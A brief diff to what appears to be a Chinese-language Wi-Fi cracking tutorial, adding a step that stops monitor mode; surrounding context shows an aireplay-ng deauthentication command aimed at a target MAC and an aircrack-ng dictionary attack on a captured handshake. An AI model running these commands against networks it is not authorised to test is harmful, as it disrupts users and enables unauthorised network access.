@@ -42,3 +42,7 @@ sudo aireplay-ng -0 5 -a [BSSID] -c [Target MAC] wlan0mon
     aircrack-ng -w [.cap存檔文件] [字典文件]
     ```
 
+8. 關閉無線網卡監聽模式.
+```bash
+sudo airmon-ng stop wlan0mon
+```
